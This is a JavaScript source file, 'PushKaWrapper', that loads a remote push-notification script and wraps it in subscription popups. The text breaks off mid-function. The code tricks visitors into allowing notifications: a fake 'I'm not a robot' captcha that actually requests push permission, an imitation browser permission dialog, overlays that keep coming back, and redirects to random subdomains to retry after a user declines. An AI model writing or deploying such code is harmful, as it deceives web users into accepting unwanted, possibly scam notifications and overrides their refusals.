'use strict';

var PushKaWrapper = function( params )
{
    this.config = {
        pid             : 1,
        sourceId        : 1,
        appId           : null,
        landingId       : null,
        manifestUrl     : 'https://ichecknotifyfriends.info/app/manifest.json',
        pushKaScript    : 'https://ichecknotifyfriends.info/push.js?b=1',
        //pushKaScript    : 'http://127.0.0.1/push.js',
        popupUrl        : 'https://ichecknotifyfriends.info/redirect',
        captchaImage    : 'https://ichecknotifyfriends.info/media/landings/captcha/images/captcha.jpg',
        //captchaImage    : 'http://127.0.0.1/media/landings/captcha/images/captcha.jpg',
        //popupUrl        : 'http://localhost/landing/captcha/redirect',
        //popupUrl        : 'http://127.0.0.1/landing/captcha/redirect',
        notificationImage : 'https://ichecknotifyfriends.info/media/landings/captcha/images/notification.png',
        redirect        : {
            count          : 1,
            declineCount   : 10,
            maxSubsCount   : 10,
            successUrl     : null,
            alreadyUrl     : null,
            declineUrl     : null,
            trafficbackUrl : null,
        },
        namePrefix      : 'pushka-',
        popupType       : 'captcha',      // captcha | gray
        popupTimeout    : 10*60,
        startPopupDelay : 5,
        subsCheckExpire : 1*24*60*60,
        subsStatusExpire: 15*60,
        lang            : 'en',
        languages       : {
            ru : {
                btnSubscribe      : 'Подписаться',
                btnContinue       : 'Продолжить',
                btnCancel         : 'Отмена',
                btnClose          : 'Закрыть',
                notRobot          : 'Я не робот',
                popupTitle        : 'Получать оповещения о последних новостях с сайта',
                popupText         : 'Для того чтобы продолжить работу, разрешите подписку',
                titleNotification : 'Уведомление',
                systemAllowTitle  : 'запрашивает разрешение на:',
                systemAllowText   : 'поступил запрос на отправку уведомлений.'
            },
            en : {
                btnSubscribe      : 'Subscribe',
                btnContinue       : 'Continue',
                btnCancel         : 'Cancel',
                btnClose          : 'Close',
                notRobot          : 'I\'m not a robot',
                popupTitle        : 'Get notification about actual news from site',
                popupText         : 'To continue, enable the subscription',
                titleNotification : 'Notification',
                systemAllowTitle  : 'wants to',
                systemAllowText   : 'wants to send you notifications'
            }
        },
        marks : {
            utm_source   : null,
            utm_medium   : null,
            utm_campaign : null,
            utm_term     : null,
            utm_content  : null
        },
        addVars : {},
        afterInitSubsStatus : function(status){}
    };

    var self = this;
    var objPushKa;
    var overlayBox;
    var redirectStatus = 'default';

    this.start           = start;
    this.popup           = popup;
    this.prompt          = prompt;
    this.redirect        = redirect;
    this.startArrowPopup = startArrowPopup;
    this.startOnSubDomain = startOnSubDomain;

    extend(this.config, params, {});

    function text(tid)
    {
        return self.config.languages[self.config.lang][tid] ? self.config.languages[self.config.lang][tid] : tid;
    }

    function extend(target) {
        if(!arguments[1])
            return;

        for(var i=1; i < arguments.length; i++) {
            var source = arguments[i];

            for(var prop in source) {
                if(source.hasOwnProperty(prop))
                {
                    if( typeof target[prop] === 'object' && target[prop] !== null )
                        extend(target[prop], source[prop]);
                    else
                        target[prop] = source[prop];
                }
            }
        }
    }

    function randomInteger(min, max) {
        var rand = min + Math.random() * (max + 1 - min);
        rand = Math.floor(rand);
        return rand;
    }

    /********************************************/

    function redirect(count, successUrl, alreadyUrl, declineUrl, trafficbackUrl, maxSubsCount, declineCount)
    {
        self.config.redirect.count          = count;
        self.config.redirect.successUrl     = successUrl;
        self.config.redirect.alreadyUrl     = alreadyUrl;
        self.config.redirect.declineUrl     = declineUrl;
        self.config.redirect.trafficbackUrl = trafficbackUrl;
        self.config.redirect.declineCount   = declineCount > 0 ? declineCount : self.config.redirect.declineCount;
        self.config.redirect.maxSubsCount   = maxSubsCount > 0 ? maxSubsCount : self.config.redirect.maxSubsCount;

        createManifest(self.config.manifestUrl);

        if( 'PushKa' in window )
            startRedirect();
        else
            loadScript(self.config.pushKaScript, startRedirect, function(){console.error('Error on load PushKa script')});
    }

    function redirectAfterInit(subs)
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed' )
        {
            redirectStatus = subsStatus;

            objPushKa.log(objPushKa.subscriptionCount+' > '+self.config.redirect.maxSubsCount);

            if( objPushKa.subscriptionCount >= self.config.redirect.maxSubsCount )
                doRedirect(self.config.redirect.alreadyUrl);
            else if(subsStatus === 'activated')
                objPushKa.subscribe();
            else
                redirectRetrySubs();
        }
        else
            objPushKa.subscribe();
    }

    function successSubsRedirect()
    {
        redirectStatus = 'subscribed';

        setTimeout(function(){
            if( objPushKa.subscriptionCount >= self.config.redirect.maxSubsCount )
                doRedirect(self.config.redirect.successUrl);
            else
                redirectRetrySubs();
        }, 1000);  // redirect after 1 sec
    }

    function notSupportRedirect()
    {
        redirectStatus = 'notSupportRedirect';

        doRedirect(self.config.redirect.trafficbackUrl);
    }

    function redirectRetrySubs()
    {
        var urlObj   = new URL(window.location.href);
        var counter  = parseInt(urlObj.searchParams.get("c_rand"));
        var declined = parseInt(urlObj.searchParams.get("d_rand"));

        counter  = counter  ? parseInt(counter)  : 1;
        declined = declined ? parseInt(declined) : 0;

        if( redirectStatus !== 'subscribed' )   // if decline user
            declined ++;

        urlObj.searchParams.set('d_rand', declined);
        urlObj.searchParams.set('c_rand', counter + 1);

        if( counter >= self.config.redirect.count || declined >= self.config.redirect.declineCount )
        {
            redirectStatus = 'declined';

            return doRedirect(self.config.redirect.declineUrl);
        }

        var hostname = urlObj.hostname.replace(/(ms-[0-9]{1,2}\.)*(.+)/, '$2');
        var newUrl   = urlObj.protocol+'//ms-'+randomInteger(1,99)+'.'+hostname+urlObj.pathname+urlObj.search;

        objPushKa.log('refresh: to new page: '+newUrl);

        redirectStatus = 'redirected';

        doRedirect(newUrl);

        return true;
    }

    function startRedirect()
    {
        objPushKa = new PushKa({
            mode         :'all-origin', /* 'system-origin', 'same-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            addVars      : self.config.addVars,
            declined     : redirectRetrySubs,
            afterInit    : redirectAfterInit,
            subscribe    : successSubsRedirect,
            notSupported : notSupportRedirect,
            notAllowed   : redirectToPromptWindow
        });

        if( window.opener )
            window.addEventListener('beforeunload', function(){ window.opener.postMessage(redirectStatus, '*');});

        //objPushKa.config.afterInit = function(subs);
    }

    function doRedirect(url)
    {
        if( url )
        {
            if( objPushKa )
                objPushKa.log('To url: '+url);
            window.location.href = url;
        }
        else
        {
            if( objPushKa )
                objPushKa.log('Close window');

            if(window.opener)
                window.close();
        }
        return true;
    }

    /********************************************/

    function popup( type, startDelay, timeout )
    {
        self.config.popupType       = type;
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        if(type === 'window')
            overlayBox = createWindow();
        else
            overlayBox = createOverlay(type);
        //overlayBox.style.display = 'block';
        // createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startPopup();
        else
            loadScript(self.config.pushKaScript, startPopup, function(){console.error('Error on load PushKa script')});
    }

    function startPopup()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode      : 'system-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid       : self.config.pid,
            appId     : self.config.appId,
            sourceId  : self.config.sourceId,
            landingId : self.config.landingId,
            marks     : self.config.marks,
            declined  : initPopupHandler,
            afterInit : initPopupHandler
        });

        //objPushKa.config.afterInit = function(subs);
    }

    function initPopupHandler()
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed')
        {
            setSubscribeStatus('subscribed');
            return;
        }

        if( subsStatus === 'unsubscribed' )
            setSubscribeStatus('unsubscribed');

        var subsButton  = document.getElementById(self.config.namePrefix+'subs-button');
        var closeButton = document.getElementById(self.config.namePrefix+'close-overlay-button');
        if( closeButton )
            closeButton.addEventListener('click', closeOverlay);

        if( subsButton )
        {
            subsButton.addEventListener('click', function()
            {
                var specs = 'width=900,height=450,menubar=no,location=no,resizable=no,scrollbars=no,status=yes';

                if(self.config.popupType === 'window')
                    specs = 'width=320,height=130,menubar=no,location=no,resizable=no,scrollbars=no,status=yes';

                var popup = window.open(self.config.popupUrl, '', specs);

                window.addEventListener("message", function(event){
                    if( event.data === 'subscribed' )
                    {
                        objPushKa.log("Subscribe by popup");
                        setSubscribeStatus('subscribed');
                    }
                    if( event.data === 'activated' )
                    {
                        objPushKa.log("Already activated by popup");
                        setSubscribeStatus('subscribed');
                    }
                    else if( event.data === 'default' )
                        objPushKa.log("Close popup");
                    else if( event.data === 'declined' )
                        objPushKa.log("Declined by popup");
                    else if( event.data === 'redirected' )
                        objPushKa.log("Popup was redirected");
                    else if( event.data === 'notSupportRedirect' )
                    {
                        setSubscribeStatus('not-support');
                        objPushKa.log("Popup not support push");
                    }
                    else
                        objPushKa.log("Popup sad:"+event.data );

                    closeOverlay();
                }, false);
            });
        }

        setTimeout(startShowOverlay, self.config.startPopupDelay*1000);
    }

    /********************************************/

    function start( startDelay, timeout )
    {
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startInit();
        else
            loadScript(self.config.pushKaScript, startInit, function(){console.error('Error on load PushKa script')});
    }

    function startInit()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode         : 'same-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            addVars      : self.config.addVars,
            afterInit    : initSubscribeHandler,
            subscribe    : successSelfSubs,
            declined     : declineSelfSubs,
            notSupported : notSupportSubs
        });
    }

    function initSubscribeHandler()
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed')
        {
            setSubscribeStatus('subscribed');
            return;
        }

        setTimeout(startSubscribe, self.config.startPopupDelay*1000);
    }

    function declineSelfSubs()
    {
        var subsStatus = objPushKa.getSubsStatus();

        console.log('decline');
        console.log(subsStatus);

        setSubscribeStatus(subsStatus);
        setShowOverlayTime();
        startSubscribe();   // for firefox retry request
    }

    function startSubscribe()
    {
        if( getIsSubscribed() || getIsSupport() )
            return false;

        if( isCanShowOverlay() === false )
        {
            setTimeout(startSubscribe, 1000);
            return false;
        }

        objPushKa.subscribe();
        return true;
    }

    /********************************************/

    function prompt( type, startDelay, timeout )
    {
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        if(type === 'light')
            overlayBox = createPromptLight();
        else if(type === 'self_window')
            overlayBox = createWindow();
        else if(type === 'self_window_redirect_on_closing')
            overlayBox = createWindow('close-overlay-button-and-redirect');
        else
            overlayBox = createPrompt('default');

        //console.log(overlayBox);
        //overlayBox.style.display = 'block';
        createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startPrompt();
        else
            loadScript(self.config.pushKaScript, startPrompt, function(){console.error('Error on load PushKa script')});
    }

    function startPrompt()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode         : 'same-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            //declined     : initPromptHandler,
            declined     : declineSelfSubs,
            afterInit    : initPromptHandler,
            subscribe    : successSelfSubs,
            notSupported : notSupportSubs,
            notAllowed   : redirectToSelfWindow
        });

        //objPushKa.config.afterInit = function(subs);
    }

    function initPromptHandler()
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed')
        {
            setSubscribeStatus('subscribed');
            return;
        }

        if( subsStatus === 'unsubscribed' )
            setSubscribeStatus('unsubscribed');

        var subsButton  = document.getElementById(self.config.namePrefix+'subs-button');
        var closeButton = document.getElementById(self.config.namePrefix+'close-overlay-button');
        var closeButtonAndRedirect = document.getElementById(self.config.namePrefix+'close-overlay-button-and-redirect');

        if( closeButton )
            closeButton.addEventListener('click', closeOverlay);

        if( closeButtonAndRedirect )
            closeButtonAndRedirect.addEventListener('click', notSupportRedirect);

        if( subsButton )
        {
            subsButton.addEventListener('click', function()
            {
                //closeOverlay();
                overlayBox.style.display = 'none';
                objPushKa.subscribe();
            });
        }

        setTimeout(startShowOverlay, self.config.startPopupDelay*1000);
    }

    function successSelfSubs()
    {
        setShowOverlayTime();   // maybe need comment it row
        setSubscribeStatus('subscribed');
    }

    function notSupportSubs()
    {
        setSubscribeStatus('not-support');
    }

    /********************************************/

    function startShowOverlay()
    {
        if( getIsSubscribed() || getIsSupport() )
            return false;

        if( isCanShowOverlay() === false )
        {
            setTimeout(startShowOverlay, 1000);
            return false;
        }

        setTimeout(showOverlay, 100);
        return true;
    }

    function showOverlay()
    {
        overlayBox.style.display = 'block';
        setShowOverlayTime();
    }

    function closeOverlay()
    {
        overlayBox.style.display = 'none';
        startShowOverlay();
    }

    function setShowOverlayTime()
    {
        if( ("localStorage" in window) !== true )
            return;

        localStorage.setItem(self.config.namePrefix+'overlay-showed', (new Date().getTime()/1000) );
    }

    function getShowOverlayTime()
    {
        if( !("localStorage" in window) )
            return null;

        return localStorage.getItem(self.config.namePrefix+'overlay-showed');
    }

    function isCanShowOverlay()
    {
        var lastShowTime = getShowOverlayTime();
        if( lastShowTime === null )
            return true;

        return (parseInt(lastShowTime) + self.config.popupTimeout) <= (new Date().getTime()/1000);
    }

    /********************************************/

    function loadScript(url, onLoadHandler, onErrorHandler)
    {
        var s = document.createElement("script");
        s.setAttribute('src', url);
        s.type = "text/javascript";
        s.async = true;
        s.onload = onLoadHandler;
        s.onerror = onErrorHandler;

        document.getElementsByTagName('head')[0].appendChild(s);
    }

    function createManifest( url )
    {
        if( document.querySelectorAll('link[rel="manifest"][dao="1"]').length > 0 )
        //if( document.querySelectorAll('link[rel="manifest"]').length > 0 )
        {
            console.log('manifest already');
            return;
        }

        var s = document.createElement("link");
        s.setAttribute('href', url);
        s.setAttribute('rel', "manifest");
        s.setAttribute('dao', "1");

        document.getElementsByTagName('head')[0].appendChild(s);
    }

    /********************************************/

    function setSubscribeStatus(status)
    {
        if( ("localStorage" in window) !== true )
            return;

        localStorage.setItem(self.config.namePrefix+'status', status );
        localStorage.setItem(self.config.namePrefix+'status-time', (new Date().getTime())/1000 );
    }

    function getSubscribeStatus()
    {
        if( !("localStorage" in window) )
            return false;

        var status = localStorage.getItem(self.config.namePrefix+'status');
        if( status === null )
            return false;

        var statusTime = localStorage.getItem(self.config.namePrefix+'status-time');

        return {status:status, time: statusTime === null ? 0 : statusTime};
    }

    function getIsSubscribed()
    {
        var subsStatusData = getSubscribeStatus();
        if( subsStatusData === false )
            return false;

        if(subsStatusData.status !== 'subscribed')
            return false;

        if( subsStatusData.time === null )
            return false;

        return (parseInt(subsStatusData.time) + self.config.subsCheckExpire) >= (new Date().getTime()/1000);
    }

    function getIsSupport()
    {
        var subsStatusData = getSubscribeStatus();
        if( subsStatusData === false )
            return false;

        if(subsStatusData.status !== 'not-support')
            return false;

        if( subsStatusData.time === null )
            return false;

        return (parseInt(subsStatusData.time) + self.config.subsCheckExpire) >= (new Date().getTime()/1000);
    }

    function checkIsCachedStatus(status)
    {
        var subsStatusData = getSubscribeStatus();
        if( subsStatusData === false )
            return false;

        if(subsStatusData.status !== status)
            return false;

        if( subsStatusData.time === null )
            return false;

        return (parseInt(subsStatusData.time) + self.config.subsStatusExpire) >= (new Date().getTime()/1000);
    }

    /********************************************/

    function popupCloseButton()
    {
        return "<div id='"+self.config.namePrefix+'close-overlay-button'+"' title='"+text('btnClose')+"' style='position:fixed; right:20px; top:20px; color:#fff; cursor:pointer; font: bold 20px/10px  Tahoma; '>"+'x'+"</div>";
    }

    function captchaButton()
    {
        var style = "border-radius:3px; " +
            "background: url("+'"'+self.config.captchaImage+'"'+") center center no-repeat; " +
            "width: 250px; " +
            "font: 16px Tahoma; " +
            "display: inline-block; " +
            "text-align: left; " +
            "padding: 40px 10px 40px 70px; " +
            "color:#000; " +
            "cursor:pointer;"

        return "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('notRobot')+"</div>";
    }

    function purposeButton(caption)
    {
        var style = "border-radius:3px; " +
            "background: #0084ff;" +
            "width: 150px; " +
            "font: 16px Tahoma; " +
            "font-weight: bold; " +
            "display: inline-block; " +
            "padding: 10px 20px; " +
            "color: #f3f3f3; " +
            //"text-transform: uppercase; " +
            "cursor: pointer;"

        var titleStyle = "font-size:22px; margin: 0px; padding: 5px 15px 10px";
        var textStyle = "font-size:14px; margin: 0px; padding: 10px 10px 20px";

        return "<div style='color:#fff;'>" +
                "<h3 style='"+titleStyle+"'>"+text('popupTitle')+"</h3>"+
                "<div style='"+textStyle+"'>"+text('popupText')+"</div>"+
                "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+caption+"</div>"+
            "</div>";
    }

    function promptButtons(caption)
    {
        var style = "border-radius:3px; " +
            "background: #0084ff;" +
            "width: 110px; " +
            "font: 16px Tahoma; " +
            "font-weight: bold; " +
            "display: inline-block; " +
            "padding: 10px 20px; " +
            "color: #f3f3f3; " +
            "float: left; " +
            "margin: 0px 5px; " +
            //"text-transform: uppercase; " +
            "cursor: pointer;"

        var titleStyle = "font-size:18px; margin: 0px; padding: 25px 15px 20px";
        //var textStyle = "font-size:14px; margin: 0px; padding: 10px 10px 20px";

        return "<div style='color:#fff;'>" +
            "<h3 style='"+titleStyle+"'>"+text('popupTitle')+"</h3>"+
            //"<div style='"+textStyle+"'>"+text('popupText')+"</div>"+
            "<div style='padding:0px 30px 10px'>"+
                "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('btnSubscribe')+"</div>"+
                "<div id='"+self.config.namePrefix+'subs-button'+"' style='"+style+"'>"+text('btnClose')+"</div>"+
                "<div style='clear:both;'></div>";
            "</div>";
            "</div>";
    }

    function createOverlay(type)
    {
        var overlay = document.createElement("div");
        overlay.style.id              = self.config.namePrefix+'overlay';
        overlay.style.backgroundColor = "rgba(0,0,0,0.8)";
        overlay.style.zIndex          = 100000000;
        overlay.style.position        = 'fixed';
        overlay.style.top             = 0;
        overlay.style.left            = 0;
        overlay.style.bottom          = 0;
        overlay.style.right           = 0;

        if( type === 'captcha' )
            var content = captchaButton();
        else
            var content = popupCloseButton() + purposeButton(text('btnContinue'));

        overlay.innerHTML = "<div id='"+self.config.namePrefix+'inner-box'+"'>" + content + "</div>";

        var box = overlay.querySelector('#'+self.config.namePrefix+'inner-box');

        document.body.appendChild(overlay);
        box.style.marginTop = Math.ceil(((overlay.offsetHeight - box.offsetHeight) / 2)*0.8)+'px';
        box.style.textAlign = 'center';
        //heightEl(overlay);
        //heightEl(box);
        overlay.style.display = 'none';

        return overlay;
    }

    function startArrowPopup( startDelay, timeout )
    {
        self.config.popupTimeout    = timeout    ? timeout    : self.config.popupTimeout;
        self.config.startPopupDelay = startDelay ? startDelay : self.config.startPopupDelay;

        overlayBox = createArrowOverlay();

        createManifest(self.config.manifestUrl); // create only on all-origin or same-origin

        if( 'PushKa' in window )
            startArrowPopupInit();
        else
            loadScript(self.config.pushKaScript, startArrowPopupInit, function(){console.error('Error on load PushKa script')});
    }

    function startArrowPopupInit()
    {
        if( getIsSubscribed())
            return console.log('activated');

        if( getIsSupport())
            return console.log('Not support push');

        objPushKa = new PushKa({
            mode         : 'same-origin', /* 'same-origin', 'system-origin', 'partner-origin', 'all-origin',*/
            pid          : self.config.pid,
            appId        : self.config.appId,
            sourceId     : self.config.sourceId,
            landingId    : self.config.landingId,
            marks        : self.config.marks,
            afterInit    : initStartArrowPopupHandler,
            subscribe    : successStartArrowPopupSubs,
            declined     : declineStartArrowPopupSubs,
            notSupported : notSupportSubs
        });
    }

    function successStartArrowPopupSubs()
    {
        setShowOverlayTime();   // maybe need comment it row
        setSubscribeStatus('subscribed');

        overlayBox.style.display = 'none';
    }

    function declineStartArrowPopupSubs()
    {
        var subsStatus = objPushKa.getSubsStatus();

        console.log('decline');
        console.log(subsStatus);

        setSubscribeStatus(subsStatus);
        setShowOverlayTime();
        startSubscribe();   // for firefox retry request

        overlayBox.style.display = 'none';
    }

    function initStartArrowPopupHandler()
    {
        var subsStatus = objPushKa.getSubsStatus();

        self.config.afterInitSubsStatus(subsStatus);

        if( subsStatus === 'activated' || subsStatus === 'subscribed')
        {
            setSubscribeStatus('subscribed');
            return;
        }

        if( subsStatus === 'unsubscribed' )
            setSubscribeStatus('unsubscribed');

        var closeButton = document.getElementById(self.config.namePrefix+'close-overlay-button');
        if( closeButton )
            closeButton.addEventListener('click', closeOverlay);

        setTimeout(startArrowPopupSubscribe, self.config.startPopupDelay*1000);
    }

    function startArrowPopupSubscribe() {
        if (getIsSubscribed() || getIsSupport())
            return false;

        if (isCanShowOverlay() === false) {
            setTimeout(startArrowPopupSubscribe, 1000);
            return false;
        }

        setTimeout(startShowOverlay, 100);
        objPushKa.subscribe();
        return true;
    }

    function createArrowOverlay() {
        var overlay = document.createElement("div");
        overlay.style.id              = self.config.namePrefix+'overlay';
        overlay.style.backgroundColor = "rgba(0,0,0,0.8)";
        overlay.style.zIndex          = 100000000;
        overlay.style.position        = 'fixed';
        overlay.style.top             = 0;
        overlay.style.left            = 0;
        overlay.style.bottom          = 0;
        overlay.style.right           = 0;

        var content = arrowPopup() + popupCloseButton();

        overlay.innerHTML = "<div id='"+self.config.namePrefix+'inner-box'+"'>" + content + "</div>";

        document.body.appendChild(overlay);

        overlay.style.display = 'none';

        return overlay;
    }

    function arrowPopup()
    {
        var messageBox = document.createElement('div'),
            message = document.createTextNode(text('popupText'));

        messageBox.id = self.config.namePrefix + 'arrow';
        messageBox.style.width = '300px';
        messageBox.style.height = 'auto';
        messageBox.style.backgroundColor = '#fff';
        messageBox.style.position = 'absolute';
        messageBox.style.left = '50%';
        messageBox.style.top = '50%';
        messageBox.style.transform = 'translate(-50%, -50%)';
        messageBox.style.textAlign = 'center';
        messageBox.style.padding = '10px 20px';
        messageBox.style.borderRadius = '5px';
        messageBox.style.cursor = 'pointer';

        if(isMobile(navigator.userAgent) === true)
        {
            messageBox.style.fontSize = '3em';
            messageBox.style.width = '60%';
            messageBox.style.top = '80%';
        }

        messageBox.appendChild(message);

        return messageBox.outerHTML;
    }

    function createPrompt(type)
    {
        var overlay = document.createElement("div");
        overlay.style.id              = self.config.namePrefix+'prompt';
        overlay.style.backgroundColor = "rgba(0,0,0,0.9)";
        overlay.style.zIndex          = 100000000;
        overlay.style.position        = 'fixed';
        overlay.style.borderRadius    = '5px';
        overlay.style.top             = '50px';
        overlay.style.left            = '50px';

        var content = /*popupCloseButton() +*/  promptButtons();

        overlay.innerHTML = "<div id='"+self.config.namePrefix+'inner-box'+"'>" + content + "</div>";

        var box = overlay.querySelector('#'+self.config.namePrefix+'inner-box');

        document.body.appendChild(overlay);
        box.style.marginTop = Math.ceil(((overlay.offsetHeight - box.offsetHeight) / 2)*0.8)+'px';
        box.style.textAlign = 'center';
        //heightEl(overlay);
        //heightEl(box);
        overlay.style.display = 'none';

        return overlay;
    }

    function createPromptLight() {

        var overlay = document.createElement('div');

        overlay.id = self.config.namePrefix+'inner-box';
        overlay.style.backgroundColor = '#fff';
        overlay.style.zIndex = 100000000;
        overlay.style.position = 'fixed';
        overlay.style.width = '100%';
        overlay.style.top = 0;
        overlay.style.left = '50%';
        overlay.style.transform = 'translateX(-50%)';
        overlay.style.maxWidth = '400px';
        overlay.style.minHeight = '100px';
        overlay.style.maxHeight = '200px';
        overlay.style.padding = '20px 20px 0px';
        overlay.style.color = '#666';
        overlay.style.fontSize = '16px';
        overlay.style.fontFamily = 'Roboto,Noto,Helvetica Neue,Helvetica,Arial,sans-serif';
        overlay.style.lineHeight = '1.3';

        if(isMobile(navigator.userAgent) === true)
        {
            overlay.style.fontSize = '3em';
            overlay.style.maxWidth = '60%';
            overlay.style.textAlign = 'center';
        }

        var textBox = document.createElement("div"),
            message = document.createTextNode(text('popupTitle'));
        textBox.appendChild(message);
        overlay.appendChild(textBox);

        overlay.innerHTML += promptLightButtons();

        document.body.appendChild(overlay);

        overlay.style.display = 'none';

        return overlay;
    }

    function promptLightButtons() {
        var btnWrap = document.createElement("div");
        btnWrap.style.cssFloat = 'right';

        var btnCancel = document.createElement("button"),
            btnCancelText = document.createTextNode(text('btnCancel'));

        btnCancel.id = self.config.namePrefix+'close-overlay-button';
        btnCancel.style.margin = '20px 10px';
        btnCancel.style.backgroundColor = '#fff';
        btnCancel.style.border = 'none';
        btnCancel.style.color = '#1165f1';
        btnCancel.style.fontSize = '15px';
        btnCancel.style.cursor = 'pointer';
        btnCancel.style.textTransform = 'uppercase';
        btnCancel.appendChild(btnCancelText);

        var btnAllow = document.createElement("button"),
            btnAllowBtn = document.createTextNode(text('btnSubscribe'));

        btnAllow.id = self.config.namePrefix+'subs-button';
        btnAllow.style.margin = '20px 10px';
        btnAllow.style.backgroundColor = '#1165f1';
        btnAllow.style.color = '#fff';
        btnAllow.style.border = 'none';
        btnAllow.style.padding = '10px 25px';
        btnAllow.style.height = 'auto';
        btnAllow.style.width = 'auto';
        btnAllow.style.textTransform = 'uppercase';
        btnAllow.style.fontWeight = '400';
        btnAllow.style.borderRadius = '2px';
        btnAllow.style.fontSize = '15px';
        btnAllow.style.boxShadow = '0 2px 5px 0 rgba(0,0,0,.16), 0 2px 6px 0 rgba(0,0,0,.12)';
        btnAllow.style.cursor = 'pointer';
        btnAllow.appendChild(btnAllowBtn);

        if(isMobile(navigator.userAgent) === true)
        {
            btnAllow.style.fontSize = '0.5em';
        }

        btnWrap.appendChild(btnCancel);
        btnWrap.appendChild(btnAllow);

        return btnWrap.outerHTML;
    }

    function createWindow(btnCloseDefaultClass = 'close-overlay-button')
    {
        // for mobile
        var overlay = document.createElement("div");
        overlay.style.id              = self.config.namePrefix+'overlay';
        overlay.style.zIndex          = 100000000;
        overlay.style.backgroundColor = 'rgba(0, 0, 0, 0.8)';
        overlay.style.position        = 'fixed';
        overlay.style.top             = 0;
        overlay.style.left            = 0;
        overlay.style.bottom          = 0;
        overlay.style.right           = 0;
        overlay.style.display         = 'block';

        var div = document.createElement("div");
        div.id = self.config.namePrefix + 'notification';
        div.style.width = '320px';
        div.style.height = '130px';
        div.style.position = 'absolute';
        div.style.top = '0px';
        div.style.left = '110px';
        div.style.background = 'white';
        div.style.fontFamily = 'tahoma';
        div.style.fontSize = '12px';
        div.style.border = '1px solid #c8c8c8';
        div.style.borderRadius = '3px';
        div.style.boxShadow = '0px 2px 5px rgba(0,0,0,0.3)';
        div.style.zIndex = '1000000';
        div.style.color = 'black';

        if (isMobile(navigator.userAgent) === true)
        {
            div.style.width = '92%';
            div.style.height = '21%';
            div.style.position = 'absolute';
            div.style.top = '40%';
            div.style.left = '4%';
            div.style.borderRadius = '10px';
        }

        var p = document.createElement("p");
        p.id = self.config.namePrefix+'paragraph-title';
        p.style.fontSize = '15px';
        p.style.marginTop = '5px';
        p.style.marginLeft = '19px';
        p.style.whiteSpace = 'nowrap';
        p.style.overflow = 'hidden';
        p.style.textOverflow = 'ellipsis';
        p.style.marginBottom = '5px';
        p.style.fontWeight = 'normal';
        p.style.fontFamily = 'tahoma';
        p.style.fontStyle = 'normal';
        p.style.fontStretch = 'normal';

        if (isMobile(navigator.userAgent) === true)
        {
            p.style.visibility = 'hidden';
            p.style.marginTop='-19px';
        }

        var ptextTemp = text('systemAllowTitle').length >= 36 ? '...' + text('systemAllowTitle').substr(text('systemAllowTitle').length-31) : window.location.origin.substr(7) + " " + text('systemAllowTitle'),
            pText = document.createTextNode(ptextTemp);

        var a = document.createElement("a");

        var notificationImg = document.createElement("img");
        notificationImg.id = self.config.namePrefix+'bell';
        notificationImg.src = self.config.notificationImage;
        notificationImg.style.width = '11px';
        notificationImg.style.height = '14px';
        notificationImg.style.margin = '6px 12px 0 21px';

        if (isMobile(navigator.userAgent) === true)
        {
            notificationImg.style.paddingTop = '2%';
            notificationImg.style.width = '4vw';
            notificationImg.style.height = '3vh';
            notificationImg.style.margin = '0px 3.5% 3.5% 9%';
        }

        var span = document.createElement("span");
        span.id = self.config.namePrefix+'txt';
        span.style.fontSize = '12px';
        span.style.fontWeight = 'normal';
        span.style.fontFamily = 'tahoma';
        span.style.fontStyle = 'normal';
        span.style.fontStretch = 'normal';

        if (isMobile(navigator.userAgent) === true)
        {
            span.style.fontSize = '3.5vw';
            span.style.position = 'absolute';
            span.style.marginTop = '1%';
        }

        var spanText = isMobile(navigator.userAgent) === true ? window.location.origin.substr(7) + ' ' + text('systemAllowText') : text('popupTitle');
        span.appendChild(document.createTextNode(spanText));

        var divBtn = document.createElement("div");
        divBtn.id = self.config.namePrefix+'buttonBlock';
        divBtn.style.display = 'flex';
        divBtn.style.justifyContent = 'flex-end';
        divBtn.style.margin = '19px 15px 0 0';

        if (isMobile(navigator.userAgent) === true)
        {
            divBtn.style.position='absolute';
            divBtn.style.bottom='15%';
            divBtn.style.right='10%';
            divBtn.style.margin=0;
        }

        var btnClose = document.createElement("a");
